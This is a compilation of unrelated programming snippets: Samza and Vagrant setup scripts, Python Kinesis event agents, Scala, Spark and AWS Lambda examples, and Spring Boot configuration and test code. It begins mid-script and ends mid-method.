  install zookeeper $DOWNLOAD_ZOOKEEPER zookeeper-3.4.3
  cp "$DEPLOY_ROOT_DIR/zookeeper/conf/zoo_sample.cfg" "$DEPLOY_ROOT_DIR/zookeeper/conf/zoo.cfg"
}

install_yarn() {
  mkdir -p "$DEPLOY_ROOT_DIR"
  install yarn $DOWNLOAD_YARN hadoop-2.4.0
  cp "$BASE_DIR/vagrant/etc/yarn-site.xml" "$DEPLOY_ROOT_DIR/yarn/etc/hadoop/yarn-site.xml"
  if [ ! -f "$HOME/.samza/conf/yarn-site.xml" ]; then
    mkdir -p "$HOME/.samza/conf"
    cp "$BASE_DIR/vagrant/etc/yarn-site.xml" "$HOME/.samza/conf/yarn-site.xml"
  fi
}

install_kafka() {
  mkdir -p "$DEPLOY_ROOT_DIR"
  install kafka $DOWNLOAD_KAFKA kafka_2.10-0.8.2.1
  # have to use SIGTERM since nohup on appears to ignore SIGINT
  # and Kafka switched to SIGINT in KAFKA-1031.
  sed -i.bak 's/SIGINT/SIGTERM/g' $DEPLOY_ROOT_DIR/kafka/bin/kafka-server-stop.sh
  # in order to simplify the wikipedia-stats example job, set topic to have just 1 partition by default
  sed -i.bak 's/^num\.partitions *=.*/num.partitions=1/' $DEPLOY_ROOT_DIR/kafka/config/server.properties
}

install() {
  DESTINATION_DIR="$DEPLOY_ROOT_DIR/$1"
  DOWNLOAD_URL=$2
  PACKAGE_DIR="$DOWNLOAD_CACHE_DIR/$3"
  PACKAGE_FILE="$DOWNLOAD_CACHE_DIR/$(basename $DOWNLOAD_URL)"
  if [ -f "$PACKAGE_FILE" ]; then
    echo "Using previously downloaded file $PACKAGE_FILE"
  else
    echo "Downloading $(basename $DOWNLOAD_URL)..."
    mkdir -p $DOWNLOAD_CACHE_DIR
    curl "$DOWNLOAD_URL" > "${PACKAGE_FILE}.tmp"
    mv "${PACKAGE_FILE}.tmp" "$PACKAGE_FILE"
  fi
  rm -rf "$DESTINATION_DIR" "$PACKAGE_DIR"
  tar -xf "$PACKAGE_FILE" -C $DOWNLOAD_CACHE_DIR
  mv "$PACKAGE_DIR" "$DESTINATION_DIR"
}

start_all() {
  $DIR/grid start zookeeper
  $DIR/grid start yarn
  $DIR/grid start kafka
}

start_zookeeper() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/zkServer.sh ]; then
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    bin/zkServer.sh start
    cd - > /dev/null
  else
    echo 'Zookeeper is not installed. Run: bin/grid install zookeeper'
  fi
}

start_yarn() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh ]; then
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh start resourcemanager
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh start nodemanager
  else
    echo 'YARN is not installed. Run: bin/grid install yarn'
  fi
}

start_kafka() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/kafka-server-start.sh ]; then
    mkdir -p $DEPLOY_ROOT_DIR/$SYSTEM/logs
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    nohup bin/kafka-server-start.sh config/server.properties > logs/kafka.log 2>&1 &
    cd - > /dev/null
  else
    echo 'Kafka is not installed. Run: bin/grid install kafka'
  fi
}

stop_all() {
  $DIR/grid stop kafka
  $DIR/grid stop yarn
  $DIR/grid stop zookeeper
}

stop_zookeeper() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/zkServer.sh ]; then
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    bin/zkServer.sh stop
    cd - > /dev/null
  else
    echo 'Zookeeper is not installed. Run: bin/grid install zookeeper'
  fi
}

stop_yarn() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh ]; then
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh stop resourcemanager
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh stop nodemanager
  else
    echo 'YARN is not installed. Run: bin/grid install yarn'
  fi
}

stop_kafka() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/kafka-server-stop.sh ]; then
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    bin/kafka-server-stop.sh || true # tolerate nonzero exit status if Kafka isn't running
    cd - > /dev/null
  else
    echo 'Kafka is not installed. Run: bin/grid install kafka'
  fi
}

# Check arguments
if [ "$COMMAND" == "bootstrap" ] && test -z "$SYSTEM"; then
  bootstrap
  exit 0
elif (test -z "$COMMAND" && test -z "$SYSTEM") \
  || ( [ "$COMMAND" == "help" ] || test -z "$COMMAND" || test -z "$SYSTEM"); then
  echo
  echo "  Usage.."
  echo
  echo "  $ grid"
  echo "  $ grid bootstrap"
  echo "  $ grid install [yarn|kafka|zookeeper|all]"
  echo "  $ grid start [yarn|kafka|zookeeper|all]"
  echo "  $ grid stop [yarn|kafka|zookeeper|all]"
  echo
  exit 1
else
  echo "EXECUTING: $COMMAND $SYSTEM"

  "$COMMAND"_"$SYSTEM"
fi
--------------------------------------------------------------------------------------------------------
#!/bin/bash
set -e

vagrant_dir=/vagrant/vagrant
bashrc=/home/vagrant/.bashrc

echo "========================================"
echo "INSTALLING PERU AND ANSIBLE DEPENDENCIES"
echo "----------------------------------------"
apt-get update
apt-get install -y language-pack-en git unzip libyaml-dev python3-pip python-yaml python-paramiko python-jinja2

echo "==============="
echo "INSTALLING PERU"
echo "---------------"
sudo pip3 install peru

echo "======================================="
echo "CLONING ANSIBLE AND PLAYBOOKS WITH PERU"
echo "---------------------------------------"
cd ${vagrant_dir} && peru sync -v
echo "... done"

env_setup=${vagrant_dir}/ansible/hacking/env-setup
hosts=${vagrant_dir}/ansible.hosts

echo "==================="
echo "CONFIGURING ANSIBLE"
echo "-------------------"
touch ${bashrc}
echo "source ${env_setup}" >> ${bashrc}
echo "export ANSIBLE_HOSTS=${hosts}" >> ${bashrc}
echo "... done"

echo "=========================================="
echo "RUNNING PLAYBOOKS WITH ANSIBLE*"
echo "* no output while each playbook is running"
echo "------------------------------------------"
while read pb; do
    su - -c "source ${env_setup} && ${vagrant_dir}/ansible/bin/ansible-playbook ${vagrant_dir}/${pb} --connection=local --inventory-file=${hosts}" vagrant
done <${vagrant_dir}/up.playbooks

guidance=${vagrant_dir}/up.guidance

if [ -f ${guidance} ]; then
    echo "==========="
    echo "PLEASE READ"
    echo "-----------"
    cat $guidance
fi
--------------------------------------------------------------------------------------------------------
/* 
 * Copyright (c) 2015 Tim Harper.
 */
import sbt._
import Keys._

import xerial.sbt.Pack._

object SamzaTasks {

  private object RenderConfigTask {
    val key = TaskKey[Unit]("renderConfig", "Samza: renders the config file template", rank = KeyRanks.ATask)
    val setting = key := {
      val s = streams.value
      val packPath = pack.value
      for (f <- ((sourceDirectory in Compile).value / "config" * "*.properties").get) yield {
        val output = packPath / "config" / f.getName
        val template = IO.read(f)

        IO.write(
          output,
          template.
            replace("${target}", (target in Compile).value.getCanonicalPath).
            replace("${project.artifactId}", name.value).
            replace("${pom.version}", version.value)
        )
        s.log.info(s"Generated ${output} from ${f}")
      }
    }
  }

  private object GetSamzaShellTask {
    val key = TaskKey[File]("getSamzaShell", "Samza: sources the samza-shell artifact", rank = KeyRanks.ATask)
    val setting = key := {
      val samzaShellFile = (target in Compile).value / s"samza-shell-0.9.1-dist.tgz"
      if (! samzaShellFile.exists)
        url(s"http://repo1.maven.org/maven2/org/apache/samza/samza-shell/0.9.1/${samzaShellFile.name}") #> samzaShellFile !

      samzaShellFile
    }
  }

  private object ExtractSamzaShellTask {
    val key = TaskKey[Unit]("extractSamzaShell", "Samza: extracts the samza-shell artifact", rank = KeyRanks.ATask)
    val setting = key := {
      val log = streams.value.log
      val packPath = pack.value
      val shellPath = GetSamzaShellTask.key.value
      val binPath = packPath / "bin"

      binPath.mkdir()

      log.info(s"Extracting ${shellPath} to ${binPath}")
      shellPath #> s"tar xz -C ${binPath}" ! log
    }
  }

  private object PackageTgzTask {
    val key = TaskKey[File]("packageJob", "Samza: produces a tarball artifact for our job", rank = KeyRanks.ATask)
    val setting = key := {
      RenderConfigTask.key.value
      ExtractSamzaShellTask.key.value
      val packPath = pack.value
      val output = (target in Compile).value / s"${name.value}-${version.value}-dist.tar.gz"

      s"tar zc -C ${packPath.getCanonicalPath} ./" #> output !

      output
    }
  }

  lazy val tasks = Seq(
    RenderConfigTask.setting,
    GetSamzaShellTask.setting,
    ExtractSamzaShellTask.setting,
    PackageTgzTask.setting
  )
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

import os, datetime, socket, json, uuid, time
from boto import kinesis

def get_filesystem_metrics(path):
  stats = os.statvfs(path)
  block_size = stats.f_frsize
  return (block_size * stats.f_blocks, # Filesystem size in bytes
    block_size * stats.f_bfree,        # Free bytes
    block_size * stats.f_bavail)       # Free bytes excluding reserved space

def get_agent_version():
  return "0.1.0"

def get_hostname():
  return socket.gethostname()

def get_event_time():
  return datetime.datetime.now().isoformat()

def get_event_id():
  return str(uuid.uuid4())

def create_event():
  size, free, avail = get_filesystem_metrics("/")
  event_id = get_event_id()
  return (event_id, {
    "id": event_id,
    "subject": {
      "agent": {
        "version": get_agent_version()
      }
    },
    "verb": "read",
    "direct_object": {
      "filesystem_metrics": {
        "size": size,
        "free": free,
        "available": avail
      }
    },
    "at": get_event_time(),
    "on": {
      "server": {
        "hostname": get_hostname()
      }
    }
  })

def write_event(conn, stream_name):
  event_id, event_payload = create_event()
  event_json = json.dumps(event_payload)
  conn.put_record(stream_name, event_json, event_id)
  return event_id

if __name__ == '__main__':                                        # a
  conn = kinesis.connect_to_region(region_name="us-east-1",
    profile_name="ulp")
  while True:                                                     # b
    event_id = write_event(conn, "events")
    print "Wrote event: {}".format(event_id)
    time.sleep(10)                                                # c
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

import json, time
from threading import Thread
from boto import kinesis
from boto.kinesis.exceptions import ProvisionedThroughputExceededException

class ShardReader(Thread):
  def __init__(self, name, stream_name, shard_id):
    super(ShardReader, self).__init__(None, name)
    self.name = name
    self.stream_name = stream_name
    self.shard_id = shard_id

  @staticmethod
  def detect_incident(event):
    decoded = json.loads(event)
    passed = None, None
    try:
      server = decoded['on']['server']['hostname']
      metrics = decoded['direct_object']['filesystem_metrics']
      pct_avail = metrics['available'] * 100 / metrics['size']
      return (server, pct_avail) if pct_avail <= 20 else passed
    except KeyError:
      return passed

  def run(self):
    try:
      next_iterator = conn.get_shard_iterator(self.stream_name,
        self.shard_id, 'TRIM_HORIZON')['ShardIterator']
      while True:
        response = conn.get_records(next_iterator, limit=10)
        for event in response['Records']:
          print '{} read event {}'.format(self.name,
            event['PartitionKey'])
          s, a = self.detect_incident(event['Data'])              # a
          if a:
            print '{} has only {}% disk available!'.format(s, a)  # b
        next_iterator = response['NextShardIterator']
        time.sleep(5)
    except ProvisionedThroughputExceededException as ptee:
       print 'Caught: {}'.format(ptee.message)
       time.sleep(5)

if __name__ == '__main__':
  conn = kinesis.connect_to_region(region_name="us-east-1",
    profile_name="ulp")
  stream = conn.describe_stream('events')
  shards = stream['StreamDescription']['Shards']

  threads = []                                                    # c
  for shard in shards:
    shard_id = shard['ShardId']
    reader_name = 'Reader-{}'.format(shard_id)
    reader = ShardReader(reader_name, 'events', shard_id)
    reader.start()
    threads.append(reader)                                        # c

  for thread in threads:                                          # d
    thread.join()
--------------------------------------------------------------------------------------------------------
package forex

import scalaz._
import Scalaz._

object AmountValidator {

  def validateAmount(raw: String): Validation[String, Double] = {  // a

    try {
      Success(raw.toDouble)                                        // b
    } catch {
      case nfe: NumberFormatException =>
        Failure("Amount must be parseable to Double, not " + raw)  // c
    }
  }
}


package forex

object Currency extends Enumeration {                              // a
  type Currency = Value
  val Usd = Value("USD")
  val Gbp = Value("GBP")
  val Eur = Value("EUR")
}

case class UnsupportedCurrencyException(raw: String)
  extends Exception("Currency must be USD/EUR/GBP, not " + raw)    // b

object CurrencyValidator1 {                                        // c

  @throws(classOf[UnsupportedCurrencyException])
  def validateCurrency(raw: String): Currency.Value = {

    val rawUpper = raw.toUpperCase(java.util.Locale.ENGLISH)
    try {
      Currency.withName(rawUpper)                                  // d
    } catch {
      case nsee: NoSuchElementException =>                         // e
        throw new UnsupportedCurrencyException(raw)
    }
  }
}


package forex

import scalaz._                                                    // a
import Scalaz._                                                    // a

object CurrencyValidator2 {

  def validateCurrency(raw: String):
    Validation[String, Currency.Value] = {                         // b

    val rawUpper = raw.toUpperCase(java.util.Locale.ENGLISH)
    try {
      Success(Currency.withName(rawUpper))                         // c
    } catch {
      case nsee: NoSuchElementException =>
        Failure("Currency must be USD/EUR/GBP, not " + raw)        // d
    }
  }
}


package forex

import scalaz._
import Scalaz._

case class OrderTotal(currency: Currency.Value, amount: Double)    // a

object OrderTotal {

  def parse(rawCurrency: String, rawAmount: String):
    Validation[NonEmptyList[String], OrderTotal] = {               // b

    val c = CurrencyValidator2.validateCurrency(rawCurrency)       // c
    val a = AmountValidator.validateAmount(rawAmount)              // d

    (c.toValidationNel |@| a.toValidationNel) {                    // e
      OrderTotal(_, _)
    }
  }
}

package nile

import org.apache.spark.{SparkContext, SparkConf}
import SparkContext._
import org.apache.spark.sql._
import functions._
import org.apache.hadoop.io.BytesWritable

object ShopperAnalysisJob {

  def main(args: Array[String]) {

    val (inFile, outFolder) = {                                    // a
      val a = args.toList
      (a(0), a(1))
    }

    val sparkConf = new SparkConf()
      .setAppName("ShopperAnalysis")
      .setJars(List(SparkContext.jarOfObject(this).get))           // b
    val sparkContext = new SparkContext(sparkConf)

    val file = sparkContext.sequenceFile[Long, BytesWritable](inFile)
    val jsons = file.map {
      case (_, bw) => toJson(bw)
    }

    val sqlContext = new SQLContext(sparkContext)
    val events = sqlContext.jsonRDD(jsons)

    val (shopper, item, order) =
      ("subject.shopper", "directObject.item", "directObject.order")
    val analysis = events
      .filter(s"${shopper} is not null")
      .groupBy(shopper)
      .agg(
        col(shopper),
        sum(s"${item}.quantity"),
        sum(col(s"${item}.quantity") * col(s"${item}.price")),
        count(order),
        sum(s"${order}.value")
      )

    analysis.rdd.saveAsTextFile(outFolder)                         // c
  }

  private def toJson(bytes: BytesWritable): String =               // d
    new String(bytes.getBytes, 0, bytes.getLength, "UTF-8")
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

import random, datetime, json, copy, time, sys
from boto import kinesis

class Jsonable:
  def to_json(self):
    return json.dumps(self, default=lambda o: o.__dict__, 
        sort_keys=True, separators=(',',':'))

class Employee(Jsonable):
  def __init__(self, id, job_role):
    self.id = id
    self.jobRole = job_role

  def promote(self):
    if self.jobRole == "JNR_MECHANIC":
      self.jobRole = "SNR_MECHANIC"
    elif self.jobRole == "JNR_DRIVER":
      self.jobRole = "SNR_DRIVER"

class Vehicle(Jsonable):
  def __init__(self, vin, mileage):
    self.vin = vin
    self.mileage = mileage

  def step_miles(self, clock_direction):
    self.mileage += (clock_direction * random.randint(0,30))
    return self

class Location(Jsonable):
  def __init__(self, latitude, longitude, elevation):
    self.longitude = longitude
    self.latitude = latitude
    self.elevation = elevation

class Package(Jsonable):
  def __init__(self, id):
    self.id = id

class Customer(Jsonable):
  def __init__(self, id, is_vip):
    self.id = id
    self.isVip = is_vip

class Event(object, Jsonable):
  def __init__(self, event, timestamp):
    self.event = event
    self.timestamp = timestamp.isoformat() + "Z"

class TruckArrivesEvent(Event):
  def __init__(self, timestamp, vehicle, location):
    self.vehicle = copy.copy(vehicle)
    self.location = location
    super(TruckArrivesEvent, self).__init__("TRUCK_ARRIVES", timestamp)

class TruckDepartsEvent(Event):
  def __init__(self, timestamp, vehicle, location):
    self.vehicle = copy.copy(vehicle)
    self.location = location
    super(TruckDepartsEvent, self).__init__("TRUCK_DEPARTS", timestamp)

class MechanicChangesOil(Event):
  def __init__(self, timestamp, employee, vehicle):
    self.employee = copy.copy(employee)
    self.vehicle = copy.copy(vehicle)
    super(MechanicChangesOil, self).__init__("MECHANIC_CHANGES_OIL", timestamp)

class DriverDeliversPackage(Event):
  def __init__(self, timestamp, employee, package, customer, location):
    self.employee = copy.copy(employee)
    self.package = package
    self.customer = copy.copy(customer)
    self.location = location
    super(DriverDeliversPackage, self).__init__("DRIVER_DELIVERS_PACKAGE", timestamp)

class DriverMissesCustomer(Event):
  def __init__(self, timestamp, employee, package, customer, location):
    self.employee = employee
    self.package = package
    self.customer = customer
    self.location = location
    super(DriverMissesCustomer, self).__init__("DRIVER_MISSES_CUSTOMER", timestamp)

class Clock:
  def __init__(self, timestamp):
    self.timestamp = timestamp

  def step(self, clock_direction):
    self.timestamp += datetime.timedelta(0, 0, 0, 0, (clock_direction * random.randint(0,300)))
    return self.timestamp

MECHANICS = [
  Employee("f2caa6a0-2ce8-49d6-b793-b987f13cfad9", "SNR_MECHANIC"),
  Employee("f6381390-32be-44d5-9f9b-e05ba810c1b7", "JNR_MECHANIC")
]

DRIVERS = [
  Employee("3b99f162-6a36-49a4-ba2a-375e8a170928", "SNR_DRIVER"),
  Employee("54997a47-252d-499f-a54e-1522ac49fa48", "JNR_DRIVER"),
  Employee("c4b843f2-0ef6-4666-8f8d-91ac2e366571", "JNR_DRIVER")
]

TRUCKS = [
  Vehicle("1HGCM82633A004352", 32332),
  Vehicle("JH4TB2H26CC000000", 7839),
  Vehicle("19UYA31581L000000", 6754)
]

LOCATIONS = [
  Location(51.5228340, -0.0818130, 7),
  Location(51.5208046, -0.1592323, -25),
  Location(51.4972997, -0.0955459, 102),
  Location(51.4704679, -0.1176902, 15),
  Location(51.4865047, -0.0639602, 4)
]

CUSTOMERS = [
  Customer("b39a2b30-049b-436a-a45d-46d290df65d3", True),
  Customer("4594f1a1-a7a2-4718-bfca-6e51e73cc3e7", False),
  Customer("b1e5d874-963b-4992-a232-4679438261ab", False)
]

PACKAGES = [
  Package("c09e4ee4-52a7-4cdb-bfbf-6025b60a9144"),
  Package("ec99793d-94e7-455f-8787-1f8ebd76ef61"),
  Package("14a714cf-5a89-417e-9c00-f2dba0d1844d"),
  Package("834bc3e0-595f-4a6f-a827-5580f3d346f7"),
  Package("79fee326-aaeb-4cc6-aa4f-f2f98f443271")
]

clock = Clock(datetime.datetime(2015, 1, 1))

def write_event(conn, stream_name, clock_direction):
  global clock

  mechanic = random.choice(MECHANICS)
  driver = random.choice(DRIVERS)
  truck = random.choice(TRUCKS).step_miles(clock_direction)
  location = random.choice(LOCATIONS)
  customer = random.choice(CUSTOMERS)
  package = random.choice(PACKAGES)
  timestamp = clock.step(clock_direction)

  event = random.choice([
    TruckDepartsEvent(timestamp, truck, location),
    TruckArrivesEvent(timestamp, truck, location),
    MechanicChangesOil(timestamp, mechanic, truck),
    DriverMissesCustomer(timestamp, driver, package, customer, location),
    DriverDeliversPackage(timestamp, driver, package, customer, location)
    ])

  conn.put_record(stream_name, event.to_json(), str(random.random()))
  return (event.__class__.__name__, timestamp)

if __name__ == '__main__':
  conn = kinesis.connect_to_region(region_name="us-east-1",
    profile_name="ulp")

  if len(sys.argv) >= 2 and sys.argv[1] == "backwards":
    step_direction = -1
  else:
    step_direction = 1

  while True:
    event, ts = write_event(conn, "oops-events", step_direction)
    print "Wrote {} with timestamp {}".format(event, ts)
    time.sleep(1)
--------------------------------------------------------------------------------------------------------
package aowlambda

import java.util.UUID, org.joda.time.DateTime
import org.json4s._, org.json4s.jackson.JsonMethods._

case class EventSniffer(event: String)                              // a
case class Employee(id: UUID, jobRole: String)
case class Vehicle(vin: String, mileage: Int)
case class Location(latitude: Double, longitude: Double, elevation: Int)
case class Package(id: UUID)
case class Customer(id: UUID, isVip: Boolean)

sealed trait Event                                                  // b
case class TruckArrives(timestamp: DateTime, vehicle: Vehicle, 
  location: Location) extends Event
case class TruckDeparts(timestamp: DateTime, vehicle: Vehicle, 
  location: Location) extends Event
case class MechanicChangesOil(timestamp: DateTime, employee: Employee, 
  vehicle: Vehicle) extends Event
case class DriverDeliversPackage(timestamp: DateTime, employee: Employee,   
  `package`: Package, customer: Customer, location: Location) extends Event
case class DriverMissesCustomer(timestamp: DateTime, employee: Employee,   
  `package`: Package, customer: Customer, location: Location) extends Event

object Event {

  def fromBytes(byteArray: Array[Byte]): Event = {
    implicit val formats = DefaultFormats ++ ext.JodaTimeSerializers.all ++
      ext.JavaTypesSerializers.all
    val raw = parse(new String(byteArray, "UTF-8"))
    raw.extract[EventSniffer].event match {                        // c
      case "TRUCK_ARRIVES" => raw.extract[TruckArrives]
      case "TRUCK_DEPARTS" => raw.extract[TruckDeparts]
      case "MECHANIC_CHANGES_OIL" => raw.extract[MechanicChangesOil]
      case "DRIVER_DELIVERS_PACKAGE" => raw.extract[DriverDeliversPackage]
      case "DRIVER_MISSES_CUSTOMER" => raw.extract[DriverMissesCustomer]
      case e => throw new RuntimeException("Didn't expect " + e)   // d
    }
  }
}


package aowlambda

import com.amazonaws.services.lambda.runtime.events.KinesisEvent
import scala.collection.JavaConverters._

class LambdaFunction {

  def recordHandler(microBatch: KinesisEvent) {

    val allRows = for {                                            // a
      recs <- microBatch.getRecords.asScala.toList
      bytes = recs.getKinesis.getData.array 
      event = Event.fromBytes(bytes)
      row = Aggregator.map(event)
    } yield row

    val reducedRows = Aggregator.reduce(allRows)                   // b

    for (row <- reducedRows) {                                     // c
      Writer.conditionalWrite(row)
    }
  }
}


package aowlambda

import awscala._, dynamodbv2.{AttributeValue => AttrVal, _}
import com.amazonaws.services.dynamodbv2.model._
import scala.collection.JavaConverters._

object Writer {
  private val ddb = DynamoDB.at(Region.US_EAST_1)

  private def updateIf(key: AttributeValue, updExpr: String,
    condExpr: String, values: Map[String, AttributeValue],
    names: Map[String, String]) {                                  // a

    val updateRequest = new UpdateItemRequest()
      .withTableName("oops-trucks")
      .addKeyEntry("vin", key)
      .withUpdateExpression(updExpr)
      .withConditionExpression(condExpr)
      .withExpressionAttributeValues(values.asJava)
      .withExpressionAttributeNames(names.asJava)

    try {
      ddb.updateItem(updateRequest)
    } catch { case ccfe: ConditionalCheckFailedException => }      // b
  }

  def conditionalWrite(row: Row) {
    val vin = AttrVal.toJavaValue(row.vin)

    updateIf(vin, "SET #m = :m",
      "attribute_not_exists(#m) OR #m < :m",
      Map(":m" -> AttrVal.toJavaValue(row.mileage)),
      Map("#m" -> "mileage"))                                      // c

    for (maoc <- row.mileageAtOilChange) {                         // d
      updateIf(vin, "SET #maoc = :maoc",
        "attribute_not_exists(#maoc) OR #maoc < :maoc",
        Map(":maoc" -> AttrVal.toJavaValue(maoc)),
        Map("#maoc" -> "mileage-at-oil-change"))
    }

    for ((loc, ts) <- row.locationTs) {                            // e
      updateIf(vin, "SET #ts = :ts, #lat = :lat, #long = :long",
        "attribute_not_exists(#ts) OR #ts < :ts",
        Map(":ts"   -> AttrVal.toJavaValue(ts.toString),
            ":lat"  -> AttrVal.toJavaValue(loc.latitude),
            ":long" -> AttrVal.toJavaValue(loc.longitude)),
        Map("#ts"   -> "location-timestamp", "#lat" -> "latitude",
            "#long" -> "longitude"))
    }
  }
}


package aowlambda

import org.joda.time.DateTime, aowlambda.{TruckArrives => TA},
  aowlambda.{TruckDeparts => TD}, aowlambda.{MechanicChangesOil => MCO}

case class Row(vin: String, mileage: Int, mileageAtOilChange: Option[Int],
  locationTs: Option[(Location, DateTime)])                        // a

object Aggregator {

  def map(event: Event): Option[Row] = event match {               // b
    case TA(ts, v, loc) => Some(Row(v.vin, v.mileage, None, Some(loc, ts)))
    case TD(ts, v, loc) => Some(Row(v.vin, v.mileage, None, Some(loc, ts)))
    case MCO(ts, _, v)  => Some(Row(v.vin, v.mileage,Some(v.mileage),None))
    case _              => None
  }

  def reduce(events: List[Option[Row]]): List[Row] =               // c
    events
      .collect { case Some(r) => r }
      .groupBy(_.vin)
      .values
      .toList
      .map(_.reduceLeft(merge))

  private val merge: (Row, Row) => Row = (a, b) => {               // d

    val m = math.max(a.mileage, b.mileage)
    val maoc = (a.mileageAtOilChange, b.mileageAtOilChange) match {
      case (l @ Some(_), None) => l
      case (l @ Some(lMaoc), Some(rMaoc)) if lMaoc > rMaoc => l
      case (_, r) => r
    }
    val locTs = (a.locationTs, b.locationTs) match {
      case (l @ Some(_), None) => l
      case (l @ Some((_, lTs)), Some((_, rTs))) if lTs.isAfter(rTs) => l
      case (_, r) => r
    }
    Row(a.vin, m, maoc, locTs)
  }
}
--------------------------------------------------------------------------------------------------------
javac --release 8 com/baeldung/MajorMinorApp.java
javac -bootclasspath "C:\Apps\Java\jdk1.8.0_31\jre\lib\rt.jar" -source 1.8 -target 1.8 com/baeldung/MajorMinorApp.java
--------------------------------------------------------------------------------------------------------
java -Xmx32m -version
echo "MAVEN_OPTS='-Xmx2048m -XX:MaxPermSize=512m'" > ~/.mavenrc
sudo add-apt-repository -y ppa:linuxuprising/java
pip install --user codecov

--------------------------------------------------------------------------------------------------------
public class MainScreenProperties {
  @Min(1)
  private int refreshRate;
  @Min(50)
  @Max(1000)
  private int width;
  @Min(50)
  @Max(600)
  private int height;
    .............
}

    @Pattern(regexp = "\\d{3}-\\d{3}-\\d{4}")
    private String value;
    @Pattern(regexp = "(?i)cell|house|work")
    private String type;
--------------------------------------------------------------------------------------------------------
var bound = binder.bind("person.date-of-birth",
	Bindable.of(LocalDate.class));

// Return LocalDate or throws if not bound
bound.get();

// Return a formatted date or "No DOB"
bound.map(dateFormatter::format).orElse("No DOB");

// Return LocalDate or throws a custom exception
bound.orElseThrow(NoDateOfBirthException::new);
--------------------------------------------------------------------------------------------------------
@Component
@PropertySource("classpath:global.properties")
@ConfigurationProperties
public class GlobalProperties {

    private int threadPool;
    private String email;

    //getters and setters

}
--------------------------------------------------------------------------------------------------------
logging:
  level:
    org.springframework.web: ERROR
    com.mkyong: DEBUG
email: test@mkyong.com
thread-pool: 10
app:
  menus:
    - title: Home
      name: Home
      path: /
    - title: Login
      name: Login
      path: /login
  compiler:
    timeout: 5
    output-folder: /temp/
  error: /error/
--------------------------------------------------------------------------------------------------------
my.secret=${random.value}
my.number=${random.int}
my.bignumber=${random.long}
my.uuid=${random.uuid}
my.number.less.than.ten=${random.int(10)}
my.number.in.range=${random.int[1024,65536]}
--------------------------------------------------------------------------------------------------------
If you do not want command line properties to be added to the Environment, you can disable them by using SpringApplication.setAddCommandLineProperties(false).

app.name=MyApp
app.description=${app.name} is a Spring Boot application

environments:
	dev:
		url: https://dev.example.com
		name: Developer Setup
	prod:
		url: https://another.example.com
		name: My Cool App
		
server:
	address: 192.168.1.100
---
spring:
	profiles: development
server:
	address: 127.0.0.1
---
spring:
	profiles: production & eu-central
server:
	address: 192.168.1.120
	
acme:
  map:
    "[/key1]": value1
    "[/key2]": value2
    /key3: value3
	
acme:
  list:
    - name: my name
      description: my description
    - name: another name
      description: another description
---
spring:
  profiles: dev
acme:
  list:
    - name: my another name
	
acme:
  map:
    key1:
      name: my name 1
      description: my description 1
---
spring:
  profiles: dev
acme:
  map:
    key1:
      name: dev name 1
    key2:
      name: dev name 2
      description: dev description 2
--------------------------------------------------------------------------------------------------------
@ConfigurationProperties("app.system")
public class AppSystemProperties {

	@DurationUnit(ChronoUnit.SECONDS)
	private Duration sessionTimeout = Duration.ofSeconds(30);

	private Duration readTimeout = Duration.ofMillis(1000);

	public Duration getSessionTimeout() {
		return this.sessionTimeout;
	}

	public void setSessionTimeout(Duration sessionTimeout) {
		this.sessionTimeout = sessionTimeout;
	}

	public Duration getReadTimeout() {
		return this.readTimeout;
	}

	public void setReadTimeout(Duration readTimeout) {
		this.readTimeout = readTimeout;
	}
}

@ConfigurationProperties("app.io")
public class AppIoProperties {

	@DataSizeUnit(DataUnit.MEGABYTES)
	private DataSize bufferSize = DataSize.ofMegabytes(2);

	private DataSize sizeThreshold = DataSize.ofBytes(512);

	public DataSize getBufferSize() {
		return this.bufferSize;
	}

	public void setBufferSize(DataSize bufferSize) {
		this.bufferSize = bufferSize;
	}

	public DataSize getSizeThreshold() {
		return this.sizeThreshold;
	}

	public void setSizeThreshold(DataSize sizeThreshold) {
		this.sizeThreshold = sizeThreshold;
	}
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class) 
@WebMvcTest
@AutoConfigureMockMvc
public class UserControllerIntegrationTest {
 
    @MockBean
    private UserRepository userRepository;
     
    @Autowired
    UserController userController;
 
    @Autowired
    private MockMvc mockMvc;
 
    //...
     
}

@Test
public void whenPostRequestToUsersAndValidUser_thenCorrectResponse() throws Exception {
    MediaType textPlainUtf8 = new MediaType(MediaType.TEXT_PLAIN, Charset.forName("UTF-8"));
    String user = "{\"name\": \"bob\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isOk())
      .andExpect(MockMvcResultMatchers.content()
        .contentType(textPlainUtf8));
}
 
@Test
public void whenPostRequestToUsersAndInValidUser_thenCorrectResponse() throws Exception {
    String user = "{\"name\": \"\", \"email\" : \"bob@domain.com\"}";
    mockMvc.perform(MockMvcRequestBuilders.post("/users")
      .content(user)
      .contentType(MediaType.APPLICATION_JSON_UTF8))
      .andExpect(MockMvcResultMatchers.status().isBadRequest())
      .andExpect(MockMvcResultMatchers.jsonPath("$.name", Is.is("Name is mandatory")))
      .andExpect(MockMvcResultMatchers.content()
        .contentType(MediaType.APPLICATION_JSON_UTF8));
    }
}
--------------------------------------------------------------------------------------------------------
    @RestController
    @RequestMapping("users")
    public class UserController {
        @Autowired
        UserService userService;
     
        @PostMapping
        public UserRest createUser(@RequestBody UserDetailsRequestModel requestUserDetails) {
            UserRest returnValue = new UserRest();
